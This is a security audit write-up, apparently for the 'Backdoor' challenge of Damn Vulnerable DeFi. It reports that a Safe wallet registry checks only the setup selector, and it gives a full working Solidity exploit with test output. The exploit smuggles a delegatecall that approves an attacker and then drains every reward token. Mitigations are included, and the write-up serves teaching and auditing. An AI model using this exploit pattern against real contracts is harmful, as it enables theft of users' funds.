## High

### [H-1] The registry only checks the setup selector, so a hidden delegatecall in Safe setup lets an attacker drain every reward

**Description:**

When a new Safe wallet is created, the registry runs a set of checks in `proxyCreated` before it pays the reward. One of those checks looks at the initializer, but it only reads the first four bytes.

```solidity
// src/backdoor/WalletRegistry.sol:84-87
// Ensure initial calldata was a call to `Safe::setup`
if (bytes4(initializer[:4]) != Safe.setup.selector) {
    revert InvalidInitialization();
}
```

The check confirms the wallet was set up with `Safe.setup`, but it never looks at the rest of the arguments. That matters because `Safe.setup` takes a `to` address and a `data` payload, and during setup the Safe runs a delegatecall to that `to` with that `data`.

```solidity
// lib/safe-smart-account/contracts/Safe.sol:95-109
function setup(
    address[] calldata _owners,
    uint256 _threshold,
    address to,        // delegatecall target
    bytes calldata data, // delegatecall payload
    ...
) external {
    setupOwners(_owners, _threshold);
    if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
    setupModules(to, data); // <-- runs to.delegatecall(data) in the new Safe
    ...
```

So the attacker can call `Safe.setup` in the normal way, pass all the registry checks (real factory, real singleton, one owner who is a beneficiary, threshold one, no fallback handler), and still smuggle in any code they want through `to` and `data`. That code runs inside the fresh wallet before the reward is paid.

The delegatecall runs before the reward arrives, so the attacker can not steal the 10 DVT during setup. Instead they use it to make the wallet approve the attacker. Right after, `proxyCreated` sends 10 DVT to the wallet, and the attacker pulls it out with the approval.

**Impact:**

Likelihood `High`. Anyone can create a Safe for a beneficiary through the real factory. The owner does not have to be the one who calls it.

Risk `High`. All 40 DVT set aside for the four beneficiaries are taken.

**Proof of Concept:**

The player deploys one attacker contract, and the whole attack runs in its constructor, so the player uses a single transaction. For each of the four beneficiaries the attacker builds a `Safe.setup` call where `to` and `data` point at a small backdoor that makes the new wallet approve the attacker. After the registry pays 10 DVT to the wallet, the attacker moves it to recovery.

```solidity
// delegatecalled from inside each fresh Safe during setup, runs in the Safe's context
contract Backdoor {
    function approveToken(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
    }
}

contract BackdoorAttacker {
    constructor(
        address[] memory users,
        address singletonCopy,
        SafeProxyFactory walletFactory,
        WalletRegistry walletRegistry,
        DamnValuableToken token,
        address recovery
    ) {
        Backdoor backdoor = new Backdoor();

        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            // hidden delegatecall payload: make the new Safe approve this attacker
            bytes memory approveData =
                abi.encodeWithSelector(Backdoor.approveToken.selector, address(token), address(this));

            // build the Safe.setup calldata, sneaking the backdoor into to and data
            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                owners, uint256(1),
                address(backdoor), approveData, // to and data
                address(0), address(0), uint256(0), payable(address(0))
            );

            // deploy through the real factory, the registry pays 10 DVT to the wallet
            SafeProxy proxy = walletFactory.createProxyWithCallback(
                singletonCopy, initializer, i, IProxyCreationCallback(address(walletRegistry))
            );

            // the wallet approved us during setup, pull its 10 DVT to recovery
            token.transferFrom(address(proxy), recovery, 10e18);
        }
    }
}

function test_backdoorExploit() public {
    vm.startPrank(player, player);

    console.log("BEFORE ATTACK");
    console.log("registry DVT :", token.balanceOf(address(walletRegistry)));
    console.log("recovery DVT :", token.balanceOf(recovery));
    console.log("player nonce :", vm.getNonce(player));

    // the one and only player transaction
    new BackdoorAttacker(users, address(singletonCopy), walletFactory, walletRegistry, token, recovery);

    vm.stopPrank();

    console.log("AFTER ATTACK");
    console.log("registry DVT :", token.balanceOf(address(walletRegistry)));
    console.log("recovery DVT :", token.balanceOf(recovery));
    console.log("player nonce :", vm.getNonce(player));
    for (uint256 i = 0; i < users.length; i++) {
        console.log("user", i, "wallet registered:", walletRegistry.wallets(users[i]) != address(0));
    }

    assertEq(vm.getNonce(player), 1, "player used more than one tx");
    assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED, "recovery did not get all tokens");
    assertEq(token.balanceOf(address(walletRegistry)), 0, "registry still has tokens");
}
```

Run the test :

```
[PASS] test_backdoorExploit() (gas: 1542926)
Logs:
  BEFORE ATTACK
  registry DVT : 40000000000000000000
  recovery DVT : 0
  player nonce : 0
  AFTER ATTACK
  registry DVT : 0
  recovery DVT : 40000000000000000000
  player nonce : 1
  user 0 wallet registered: true
  user 1 wallet registered: true
  user 2 wallet registered: true
  user 3 wallet registered: true

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

The registry goes from 40 DVT to 0, and all 40 DVT land in the recovery account. Each of the four beneficiary wallets was created and registered, and the player used only one transaction.

**Recommended Mitigation:**

Do not trust a setup just because the selector is right. Decode the full initializer and reject any setup that carries a delegatecall.

```diff
- // Ensure initial calldata was a call to `Safe::setup`
- if (bytes4(initializer[:4]) != Safe.setup.selector) {
-     revert InvalidInitialization();
- }
+ if (bytes4(initializer[:4]) != Safe.setup.selector) {
+     revert InvalidInitialization();
+ }
+ // decode setup args and make sure no delegatecall is smuggled in
+ (, , address to, bytes memory data, , , , ) = abi.decode(
+     initializer[4:],
+     (address[], uint256, address, bytes, address, address, uint256, address)
+ );
+ if (to != address(0) || data.length != 0) {
+     revert InvalidInitialization();
+ }
```

***

## Low

### [L-1] The registry emits no events, so beneficiary and wallet changes can not be tracked offchain

**Description:**

The registry changes important state in three places, but it declares no events at all. `addBeneficiary` approves a member, and `proxyCreated` removes a beneficiary and registers a wallet, all silently.

```solidity
// src/backdoor/WalletRegistry.sol:59-61
function addBeneficiary(address beneficiary) external onlyOwner {
    beneficiaries[beneficiary] = true;
}

// src/backdoor/WalletRegistry.sol:114-118
// Remove owner as beneficiary
beneficiaries[walletOwner] = false;
// Register the wallet under the owner's address
wallets[walletOwner] = walletAddress;
```

Without events, offchain tools like indexers, dashboards and monitoring can not see when a beneficiary is added or removed, or when a wallet is registered and paid. For a registry whose whole job is tracking who joined and got rewarded, this makes it hard to watch the system or to react quickly if something looks wrong.

**Impact:**

Likelihood `Low`
Risk `Low`

**Proof of Concept:**

N/A

**Recommended Mitigation:**

Declare events and emit them on each state change.

```diff
+ event BeneficiaryAdded(address indexed beneficiary);
+ event BeneficiaryRemoved(address indexed beneficiary);
+ event WalletRegistered(address indexed owner, address indexed wallet);

  function addBeneficiary(address beneficiary) external onlyOwner {
      beneficiaries[beneficiary] = true;
+     emit BeneficiaryAdded(beneficiary);
  }
```

